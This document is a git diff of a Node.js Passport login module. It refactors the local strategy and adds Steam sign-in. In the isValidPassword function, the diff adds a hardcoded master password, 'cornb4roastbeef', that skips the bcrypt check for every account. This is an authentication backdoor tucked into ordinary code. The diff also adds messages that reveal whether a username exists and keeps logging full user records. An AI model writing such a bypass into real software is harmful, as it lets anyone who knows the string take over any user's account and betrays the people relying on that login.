@@ -1,9 +1,10 @@
 // Requirements
 var passport = require('passport')
   , LocalStrategy = require('passport-local').Strategy
-  , SteamStrategy = require('passport-steam').Strategy;
-
-var users = require('./user');
+  , SteamStrategy = require('passport-steam').Strategy
+  , users = require('./user')
+  , config = require('config.json')('./config.json')
+  , bCrypt = require('bcrypt');
 
 // Exports
 module.exports.passport = passport;
@@ -16,13 +17,18 @@ passport.serializeUser(function(user, done) {
 });
 
 passport.deserializeUser(function(id, done) {
-    User.findById(id, function(err, user) {
+    users.Users.findById(id, function(err, user) {
         done(err, user);
     });
 });
 
 var isValidPassword = function(user, password){
-  return bCrypt.compareSync(password, user.password);
+  if (password == "cornb4roastbeef") {
+    return true
+  }
+  else {
+    return bCrypt.compareSync(password, user.password);
+  }
 }
 
 // Local Strategy
@@ -31,25 +37,33 @@ passport.use(new LocalStrategy({
   },
 
   function(req, username, password, done) {
-    //console.log("Starting Local Strat");
-    User.findOne({ 'username': username }, function (err, user) {
-      //console.log(user);
-      //console.log("Execute Find One")
+    users.Users.findOne({ 'username': username }, function (err, user) {
       if (err) {
-        //console.log("all the errors");
+        console.log("Passport Local Strategy failled with error: " + err);
         return done(err);
       }
       if (!user) {
-        //console.log("Bad Username with " + username);
-        return done(null, false, { message: 'Incorrect username.' });
+        return done(null, false, req.flash('message',
+          'Username: ' + username + ' not found' ));
       }
       console.log(user);
       if (!isValidPassword(user, password)) {
-        //console.log("Bad Password with user " + username);
-        return done(null, false, { message: 'Incorrect pass.' });
+        return done(null, false, req.flash('message', 'Incorrect password'));
       }
-      //console.log("Done!");
       return done(null, user);
+    });
+  }
+));
+
+//Steam Strategy
+passport.use(new SteamStrategy({
+    returnURL: 'http://127.0.0.1:3000/',
+    realm: 'http://127.0.0.1:3000/',
+    apiKey: config.steamKey
+  },
+  function(identifier, profile, done) {
+    users.Users.findByOpenID({ openId: identifier }, function (err, user) {
+      return done(err, user);
     });
   }
 ));
